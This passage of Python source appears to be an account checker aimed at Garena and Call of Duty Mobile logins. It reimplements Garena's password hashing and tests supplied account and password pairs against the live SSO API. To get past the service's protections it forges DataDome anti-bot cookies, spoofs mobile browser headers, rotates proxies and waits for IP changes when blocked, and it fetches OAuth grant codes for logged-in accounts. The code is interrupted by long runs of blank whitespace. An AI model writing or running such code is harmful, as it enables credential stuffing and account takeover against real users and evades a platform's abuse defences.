        self.load_initial_cookies()

    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set((line.strip() for line in f if line.strip()))

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            


    def load_initial_cookies(self):
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                for line in f:
                    cookie = line.strip()
                    if cookie and cookie not in self.banned_cookies:
                        self.live_cookies.append(cookie)

    def is_banned(self, cookie):
        return cookie in self.banned_cookies

    def mark_banned(self, cookie_value):
        formatted_cookie = cookie_value if 'datadome=' in cookie_value else f'datadome={cookie_value}'
        with self.lock:
            if formatted_cookie in self.live_cookies:
                self.live_cookies.remove(formatted_cookie)
            if formatted_cookie not in self.banned_cookies:
                self.banned_cookies.add(formatted_cookie)
                threading.Thread(target=self._append_to_file, args=('banned_cookies.txt', formatted_cookie), daemon=True).start()


 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

    def get_valid_cookies(self):
        with self.lock:
            cookies = list(self.live_cookies)
            if cookies:
                random.shuffle(cookies)
            return cookies

    def save_cookie(self, datadome_value):
        if not datadome_value:
            return False
        val = datadome_value.strip()
        formatted_cookie = val if val.startswith('datadome=') else f'datadome={val}'
        with self.lock:
            if formatted_cookie not in self.banned_cookies and formatted_cookie not in self.live_cookies:
                self.live_cookies.append(formatted_cookie)
                threading.Thread(target=self._append_to_file, args=('fresh_cookie.txt', formatted_cookie), daemon=True).start()
                return True
        return False

    def _append_to_file(self, filename, content):
        try:
            with open(filename, 'a') as f:
                f.write(content + '\n')
        except Exception:
            pass

# ============================================
# ENCRYPTION FUNCTIONS (From cod.py)
# ============================================

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(';'):
        item = item.strip()
        if not item:
            continue
        if '=' in item:
            try:
                key, value = item.split('=', 1)
                cookie_dict[key.strip()] = value.strip()
            except ValueError:
                pass
    session.cookies.update(cookie_dict)

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

def init_ga_cookies(session):
    timestamp = int(time.time())
    random_id = random.randint(1000000000, 9999999999)
    ga_cookies = {
        '_ga': f'GA1.1.{random_id}.{timestamp}',
        '_ga_XB5PSHEQB4': f'GS2.1.s{timestamp}$o1$g0$t{timestamp}$j53$l0$h0',
        '_ga_1M7M9L6VPX': f'GS2.1.s{timestamp}$o6$g0$t{timestamp}$j60$l0$h0'
    }
    for name, value in ga_cookies.items():
        session.cookies.set(name, value, domain='.garena.com')
    return ga_cookies

# ============================================
# DATADOME FUNCTIONS (From cod.py)
# ============================================

_ip_wait_lock = threading.Lock()
_ip_wait_active = False
_ip_wait_event = threading.Event()
_suppress_ip_prints = False
_ip_block_callback = None

def get_datadome_cookie(session, proxies=None):
    url = 'https://datadome.garena.com/js/'
    headers = {
        'host': 'datadome.garena.com',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        'content-type': 'application/x-www-form-urlencoded',
        'sec-ch-ua-mobile': '?1',
        'accept': '*/*',
        'origin': 'https://account.garena.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://account.garena.com/',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=1, i'
    }
    payload = {
        'jspl': 'uhk7aBw8V8QkzKqkD7oowSyHXYy8ZX7MmiUVrKaorg4WGvVIeIUSbulWtdOJ-PUEdBXKeo0f3jFGgmzdlB85r2RTWFz9fVv5sihqWKKaYJ6CqD-x5zgp4GOG3qoJiFhGN4kuNWqswcZLbrpRGv_O6e2sAwpgKZ7UoEV71CS52-nzpUt2jfpFIwctsv3plEmyMubajP6vKWqxE6fF4kkWUvI8q9dzm6A5lBucuHv8D4ZIT-WHjjpgX1Q0FQkkEIjmpzHUxJ0DRxcPKRuxAUzAO6pONT5WAHDO1jKmP3X2um9tUpE2TL7uq4RFr39BXU1iVX-cCHBf_sW242UicatUznsEPvwDhgbbd7b3t1CWZ4bekhZNAa92m1_keFZXckvIVqAvC4nT35Ir9pKHWXIa15NRSZqUG32SVsipj9JUkNEStxCDYJqzBY-UMZeuXHIJdTitf1f0bndipuAe6bgF7yqCi7hIjD-PpV-L5RbW6i8HMiaxCiECXJUA6tebiecmDc1SZrhTDhWyD_jTwxjfveNNWKAsQH8EQ7G0xiD97wfxfNp7F2cdEcYj84ncOMT5BuhwIjhb8PwcPdu_bTVWbvSB6AgR0SJVShMjcVNKz9z2ol1m-lFkIMA78dlk-xqMBQa-P4V-UPqIwLHUsbhf4NP_CbSh49dkO2ul_jp3X-ZprX00HWUschukkHYxwuUd9ppO8L8dnaYVIFCltePBoWFTgaxjYrQEjuFbiy9uhMagFkGiLpt0JtBL0sGKM2JClV-KbTqDPix1hrTDU2LO20NFh6g8s3v42ix4zE6bqdijVO61jFYv2pZUJPGS6eTcKcLGbBwD1NYsI1aZ2OotVwX5i1udmlSjm3q_-7aguTeAWzmqZk36jUOrccoTnwAwDbRfpNqZU6gLVQs-xLYJhHCos3vGFCS-Ku4URj5fTmoZhdxqMViI-IaGQrEJ3qsEfuvi-ch9owf37yzu97gNduNAt0bhlHkE2BE05Yc-lcbcewv8yKp4F4G7ff-AlM3mejP6yhxvHuNqUXjLD-mXJ2axxVSfFep_Vh74lNGhTXbT4D_DfDohQonHT8U2Anml_5zsR8KFzVZRXn4HIbQcR_5E8PKijaoIU3OEhmjzMRledTIFLWD8gxruwMBMbgxFI11DxuwuIiCP4QFSMd9qItvv2lW5HXUN3tqdBf6ioXgCR1wkmZxwpXfbNrwovhZ9_58OvnplHBRFIj78DWKM5p2p83rXSpx6rH203gKthaI8XFJUBKtZZeW4TQB1fNaC_GCmw52cSPx7JdlP4JJkg43F8AXGcoQdGWmTLw_5aEH_glk2iFlH3UR6Q63h3a9CU6s6RcIDahxwRsx_GDmE-3yOuZ_aofpbq0gdZpfXf3lbRkUXPf52U-IMzWzFXTn23wzoauduqCFqomiuRr1lcInJQlZBk3n0gZRD_gA4MvKLChl8TAMbZfkqW56PIt1EAuKqFXzCfMtQa5fCdZ7NGrxhZ0iFedp446I9yP_GOjkNixwwLxSan4mmKLD9I4EZKves6_g4I0eFuFRep7MGKUrTbCc6CG4zB646VRJDN55PJqeJYA_H1yNQXOWfCyJHW3fK2G4u2CLbMyrHVw5ZCb_J2ScgqYRVKOUfGH31suG6mabkIonirhCf4qXfSUCwYeXL2L-Ka_EF28BSSO4tR6qnd8rHlZZvPQRrHuMuqthMkJxr7aW4GQUoewBYuQUienYbIIGv_Q86h2VA-kR_ibFE769ky5ALj2SPGBc_l0jSlhLGEO5ZX4UK_tVoREYH7Abn2pjhwnRGuvVGbTqb78yLLmhGSdgrIPAQLhkgoe-g9LSS0RoqNrrN3ffHDZ3mHIqI5MePIhmtI9ImH6mYk7tiqPvFLab6mvoTWTngVNe6bq51TxeHB1-Mnxe__4progZdJQndsIeSjyLkSGi2gDSH1tDCf3F4esSy-3YG1eZ3LG8pFbO9f3qS-lM0HQh2uKUa-Fa1ZvbHqXZkR46-_pIZpxai7QDm2EuwiR60p6e03FLIIn8DVM20KPsJp3KQlDhVP72sXewVMOVnedyiNT-XDhjJM7vqXetag8ctk9eXhKi3UTqj_PBK4mjQ-wSJ5REb2cwRW07jS_cxqcGTQOt7kgFHLoEWqFQ1qG2UJF2wjGR8MZ5oaUu6TTmQQBw1Pvu8qJEWTBMLcjTkP1VPse_YOuh_LggYMhZlPBLVnFRaOeMqV2Wd23ZAUxuwbjuY876AKFaUDS151nUdl8Asis9bN_ab7GNZ7OL3MaJ8vx7t6QerZUSuKY_ORWTw0Tlehb9VWmPNQRToNuZ6APk0ebEo2WHEdYewnKLwOvYG4ylIp12xYf2E1m1-3ajQHeUjGB__JpzADPIZsk654YNwPTyhINRDlSxOtCKKs0NOqM7i45ZLn9qDOjMIB-HQpKJsAxNFGCwGVqGd5X_ZOlotWW8jjZQ-57Wc3EiFqNM9aBB7FwBq6IeMOaqDNosY0EpLgJNUPC5zK8wX09BfqaUnsxE_Z-kYW639gJBIhyhCEbumEkV5-ZS4cXaO80n56XyMr8ZB4mSmTfYgg_n45xSvx07i1bZmfxT3YeQ8786d3lK3qMzlz828Og8L5-r7WqIQ5xAf00SBJ5aFuqXaunYMDUxMaF6Pku07heHKz66bAmdZL_6MYVbF3nfJhJWKrHIFa5yYK-KckQ2fwlpbKxitHDFrs0uUVSarjFrDS2cU8SDNUWMaT81waYXhX4FKV6fSjiJqIeiCKHHkkHHoAEkAAaVfZExm1sUvYickmv6w-hnpyhS1FOv4tFP2TcB1wuKhdpDuKKOxDMu4Qlps_ln88cYVUcrIyamgWr2hGwbho5T5_wuyaGD7LC63GV621TIxJ_P2TH5-dbtb26JF25CBGvu6bnJOXeRUBfUaJ9e2ZVs9iCvef0wvjQmGuHKOTfpTKhb6Mc2QV2wk7US-29PYUNS44_ivf272Acf2Zu4wtSedVWGEH0od9MiWEzdkW2n1pZK_zXPt-3cu3Jql7mF_yyRuKQfMfIMyiRnzIbnTKSOUxkRAnXPqP8tuDx--GUtMjwbnuK73qEB7oNcGCkrWIRifDskzeixKidgiNigmMrRjyqpTY5JzLm_ve5vVk-TyzAwmRwLvhANV4XxYjceRTau5XJLv3DjyxcbNZrzAv1KqMtwEdbCI3WJPkmnRe0vII9ipRgFJRZgX7qOOOHtJgKqv34suqJeJG9wRHujcmGr3ac1LhhWcfpDwWKgEPCvajN7o1XRFAt3JPPaXLclHCNZQD42O1-KieWNYscwhh0O1x8ozs5kx_JkmseBN3PH-VfehO38OgJnIh0EaHHjNxk25O04Y3pE46qOc3Xjrod7Z9zDA5EpjZZ2qP6-sYiGw0CDijEQ95w_EfF7EeZUwxGO1t0oIRp6XqrwG1D4FE_vTW84oJIW-jHPRUfK8HzGUyLJQWvsxxJgObltbdveTkynGZAarATYYprb6WEEULjJLjatZ2KTT3jJLBlAJ2RsbKLODGNgdoILt1gdxeyp-hBgOtPdINpbeTBXeK5uevKYM9z_jvctNj3m-dy03Xz6xKd0ZWT55Kobr1TyddHokG_lJDFFeZYjeHu9u7JWv2fYjpls1BAp8_paDg66fS6bJ_DjpMuqY1SchS0Ce0SmFuu9UcxGYVkeCox47zEMxFqTYNIfCVlIonJBu1SLs1_t4CgS1bLsbCrxCie6gnwYlj9x1NN-gwpzKTMowcH9mjJmEmhX_4s6f6tWU3CNNHZXESdtMqbZ8favw1y2_yQ8-gCoVF3iCMAJI5xCTyyWrM9Mir_DczIKoc4nGP4NWZ2ATyI01OB6Z2ZcbrndXeKsPUXqII8-OYwW3gJxGFOlOPFfq2CAldYjyzP9r5VLYbGQnelUtvE9GWSwfYYYPD_p3BAFs3GQ57ndvkxcTA8BtzXMdPucKaNmJIJi1IvbA4dnjAGqAyhlpeesEHHwG5hK7LAvMfbFtNiBjltzAPGjYwqxidr3bL-ANw08woJR8j9Tq7ENDXbqsi77YHI95srjtah_l4aiCT4zUvdT8e41Z3EsS2dCVG8MuPge5j93H7-Okcau8_-QwzeaW59wZfHfhlNOFgH177W0iFjnjSnA8UWZZ2KdIX9KbsgLUGBrN5U2WT4zjXuh9CbHvxGwpc2YpAKx-FCh1AJUTJzeHuphB7pUIni5ePV5KuCewwyEnXu5BaJbmR3g8YkoXbH9xjXnLy2KgS_OqBhyMt0xwwx7yBac7bPSCnVyZ2qduoGY9O3qZp7IvQ1QsW3ibNch33k8oAZLRjOS_UlfnPeVe3ALGIw2sZOY-06b3cGt9xTqDjDdrGBPuPGVF0y3YEHpVoK5K7KFTubDB_Y8rsdvWane0xkoDoF8M8gq_1E_Wr09TAndPx2lvKVoTLXPgQCH_eNzIds9Ec_I_SdiydIXmSVcv3w7PQyAtmhsK7Ga06gujlMHKri1zK1cDbPJdxeFHW7Bfwnn6Upbij9qHjF4mHYjgHn_zWVQxh4BBnkYsnBtapQOYEfO0MnX8eXhcidk5BeCTk4RC0fKSEp8-2DuDGPdpkHHtEKibkw64Mc41MJ4Tz1mAQKxaXbNa28snq1uonIzOi7P_mf5O6AEHfvN9ONc5oGg9wXcHsknNgICGEvnssQ8avliUyI9tkUxqrIyPn5aBdt2vQtDLKAucioT9bg',
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'ISkde2yWEsap_rca8kFx8KRU7KyOv16N2yKK8zLXVO1Y2Xa2i_akWInfmy~dIlJBLQcPaZq6tXXCwXC4FIo1dLi2ZUonhelNtFSZoyIsDdmX0uxT1InMizbY4~zZh3jJ',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '5.6.6'
    }
    data = '&'.join((f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items()))
    try:
        response = session.post(url, headers=headers, data=data, proxies=proxies, timeout=30)
        response.raise_for_status()
        response_json = response.json()
        if response_json.get('status') == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            if '=' in cookie_string and ';' in cookie_string:
                datadome = cookie_string.split(';')[0].split('=')[1]
            else:
                datadome = cookie_string
            return datadome
    except Exception:
        pass
    return None

# ============================================
# DATADOME MANAGER (From cod.py)
# ============================================

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0

    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)

    def get_datadome(self):
        return self.current_datadome

    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception:
            return None

    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception:
            pass

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception:
            return False

    def get_current_ip(self):
        ip_services = ['https://api.ipify.org', 'https://icanhazip.com', 'https://ident.me', 'https://checkip.amazonaws.com']
        for service in ip_services:
            try:
                response = requests.get(service, timeout=8)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:
                        return ip
            except Exception:
                continue
        return None

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
        global _ip_wait_lock, _ip_wait_active, _ip_wait_event
        with _ip_wait_lock:
            if _ip_wait_active:
                is_primary = False
            else:
                _ip_wait_active = True
                _ip_wait_event.clear()
                is_primary = True
        if not is_primary:
            _ip_wait_event.wait(timeout=max_wait_time + 30)
            return True
        try:
            original_ip = self.get_current_ip()
            if not original_ip:
                if not _suppress_ip_prints:
                    _log('WARNING', 'IP BLOCKED — could not detect IP, waiting 10s')
                if _ip_block_callback:
                    _ip_block_callback(True)
                time.sleep(10)
                if _ip_block_callback:
                    _ip_block_callback(False)
                return True
            if not _suppress_ip_prints:
                _log('ERROR', f'IP BLOCKED — {original_ip}')
                _log('WARNING', 'Change your IP now — VPN / Mobile Data / Airplane Mode')
            if _ip_block_callback:
                _ip_block_callback(True)
            start_time = time.time()
            if not _suppress_ip_prints:
                while time.time() - start_time < max_wait_time:
                    time.sleep(check_interval)
                    current_ip = self.get_current_ip()
                    if current_ip and current_ip != original_ip:
                        _log('SUCCESS', f'IP changed: {original_ip} → {current_ip}')
                        if _ip_block_callback:
                            _ip_block_callback(False)
                            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
                                        
                            
                        return True
                _log('ERROR', 'IP did not change within time limit')
                if _ip_block_callback:
                    _ip_block_callback(False)
                return False
            else:
                while time.time() - start_time < max_wait_time:
                    time.sleep(check_interval)
                    current_ip = self.get_current_ip()
                    if current_ip and current_ip != original_ip:
                        if _ip_block_callback:
                            _ip_block_callback(False)

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
                            
                        return True
                if _ip_block_callback:
                    _ip_block_callback(False)
                return False
        finally:
            with _ip_wait_lock:
                _ip_wait_active = False
            _ip_wait_event.set()

    def handle_403(self, session):
        self._403_attempts += 1
        if self._403_attempts >= 3:
            if self.wait_for_ip_change(session):
                self._403_attempts = 0
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    self.set_session_datadome(session, new_datadome)
                return True
            else:
                return False
        return False

# ============================================
# PRELOGIN & LOGIN FUNCTIONS (UPDATED with v2.py headers)
# ============================================

def prelogin(session, account, datadome_manager, cookie_manager, retries=3, proxy_manager=None):
    all_403 = True
    for attempt in range(retries):
        try:
            url = 'https://sso.garena.com/api/prelogin'
            params = {
                'app_id': '10100',
                'account': account,
                'format': 'json',
                'id': str(int(time.time() * 1000))
            }
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key', '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            
            headers = {
                "Host": "sso.garena.com",
                "Connection": "keep-alive",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "Accept": "application/json, text/plain, */*",
                "sec-ch-ua-mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua-platform": '"Android"',
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-PH,en-US;q=0.9,en;q=0.8",
            }
            
            if cookie_header:
                headers["Cookie"] = cookie_header
                
            response = session.get(url, headers=headers, params=params, timeout=30)
            
            if response.status_code == 403:
                proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
                fresh_dd = get_datadome_cookie(session, proxies=proxy_dict)
                if fresh_dd:
                    datadome_manager.set_datadome(fresh_dd)
                    datadome_manager.set_session_datadome(session, fresh_dd)
                else:
                    datadome_manager.handle_403(session)
                if attempt < retries - 1:
                    time.sleep(1)
                    continue
                all_403 = True
                break
                
            if response.status_code == 429:
                time.sleep(3)
                continue
                
            response.raise_for_status()
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return (None, None, None)
                
            new_cookies = response.cookies.get_dict()
            new_datadome = new_cookies.get('datadome')
            if new_datadome:
                datadome_manager.set_datadome(new_datadome)
                
            if 'error' in data:
                return (None, None, new_datadome)
                
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
                            
                
            v1 = data.get('v1')
            v2 = data.get('v2')
            
            if not v1 or not v2:
                return (None, None, new_datadome)
                
            return (v1, v2, new_datadome)
            
        except requests.exceptions.ConnectionError:
            all_403 = False
            if proxy_manager and proxy_manager.is_loaded():
                session.proxies.clear()
                session.proxies.update(proxy_manager.get_next())
            if attempt < retries - 1:
                time.sleep(2)
                continue
                
        except requests.exceptions.Timeout:
            all_403 = False
            if proxy_manager and proxy_manager.is_loaded():
                session.proxies.clear()
                session.proxies.update(proxy_manager.get_next())
            if attempt < retries - 1:
                time.sleep(0.5)
                continue
                
        except Exception:
            all_403 = False
            if attempt < retries - 1:
                time.sleep(1)
                continue
                
    if all_403:
        return ('IP_BLOCKED', None, None)
    return (None, None, None)

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    
    headers = {
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "Referer": "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH",
        "Accept-Language": "en-PH,en-US;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Host": "sso.garena.com",
        "Connection": "keep-alive",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty"
    }
    if cookie_header:
        headers["Cookie"] = cookie_header
        
    retries = 5
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()
            login_cookies = {}
            if 'set-cookie' in response.headers:
                for cookie_str in response.headers['set-cookie'].split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception:
                            pass
            try:
                for k, v in response.cookies.get_dict().items():
                    if k not in login_cookies:
                        login_cookies[k] = v
            except Exception:
                pass
            for k, v in login_cookies.items():
                if k in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(k, v, domain='.garena.com')
            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(0.5)
                    continue
                return None
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            if 'error' in data:
                error_msg = data['error']
                if error_msg in ('ACCOUNT DOESNT EXIST', 'error_no_account', 'error_auth', 'error_user_ban', 'error_security_ban'):
                    return f'permanent_fail:{error_msg}'
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None
            return sso_key
        except requests.RequestException:
            if attempt < retries - 1:
                time.sleep(0.5)
                continue
    return None

# ============================================
# PRELOGIN NO IP WAIT (UPDATED with v2.py headers)
# ============================================

def _prelogin_no_ip_wait(session, account, datadome_manager, max_retries=3):
    url = 'https://sso.garena.com/api/prelogin'
    for attempt in range(max_retries):
        try:
            params = {
                'app_id': '10100',
                'account': account,
                'format': 'json',
                'id': str(int(time.time() * 1000))
            }
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key', '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            
            headers = {
                "Host": "sso.garena.com",
                "Connection": "keep-alive",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "Accept": "application/json, text/plain, */*",
                "sec-ch-ua-mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua-platform": '"Android"',
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-PH,en-US;q=0.9,en;q=0.8",
            }
            
            if cookie_header:
                headers["Cookie"] = cookie_header
                
            resp = session.get(url, headers=headers, params=params, timeout=10)
            new_dd = resp.cookies.get('datadome')
            if new_dd:
                session.cookies.set('datadome', new_dd, domain='.garena.com')
                datadome_manager.set_datadome(new_dd)
                
            if resp.status_code == 403:
                fresh = get_datadome_cookie(session)
                if fresh:
                    datadome_manager.set_datadome(fresh)
                    datadome_manager.set_session_datadome(session, fresh)
                    time.sleep(0.3)
                    continue
                return (None, None, None)
                
            resp.raise_for_status()
            data = resp.json()
            
            if 'error' in data:
                return (None, None, None)
                
            v1 = data.get('v1')
            v2 = data.get('v2')
            
            if not v1 or not v2:
                return (None, None, None)
                
            return (v1, v2, new_dd)
            
        except Exception:
            if attempt < max_retries - 1:
                time.sleep(0.3)
            continue
            
    return (None, None, None)

# ============================================
# CODM CHECK FUNCTIONS (From cod.py)
# ============================================

def _generate_device_id():
    import uuid
    return f'02-{uuid.uuid4()}'

def get_codm_grant_code(session):
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
            random_id = str(int(time.time() * 1000))
            grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for name in ['apple_state_key', 'fb_state', 'google_state', 'huawei_state', 'line_state', 'twitter_state', 'vk_state', 'tiktok_state', 'youtube_state', 'sso_key', 'datadome']:
                if name in current_cookies:
                    cookie_parts.append(f'{name}={current_cookies[name]}')
            cookie_header = '; '.join(cookie_parts)
            grant_headers = {
                'Host': '100082.connect.garena.com',
                'Connection': 'keep-alive',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36; GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)',
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'Origin': 'https://100082.connect.garena.com',
                'X-Requested-With': 'com.garena.game.codm',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9'
            }
            if cookie_header:
                grant_headers['Cookie'] = cookie_header
            grant_body = f'client_id=100082&response_type=code&redirect_uri=gop100082%3A%2F%2Fauth%2F&create_grant=true&login_scenario=normal&format=json&id={random_id}'
            resp = session.post(grant_url, headers=grant_headers, data=grant_body, timeout=12)
            resp.raise_for_status()
            data = resp.json()
            code = data.get('code', '')
            if not code:
                logger.error(f'[ERROR] token/grant returned no code: {data}')
            return code
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
                        
            
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < OAUTH_MAX_RETRIES - 1:
                delay = OAUTH_RETRY_DELAY * 2 ** attempt
                time.sleep(delay)
                continue
            else:
                logger.error(f'[ERROR] Error in get_codm_grant_code after {OAUTH_MAX_RETRIES} attempts')
                raise
        except Exception as e:
            logger.error(f'[ERROR] Error in get_codm_grant_code (token/grant)')
            return ''
    return ''
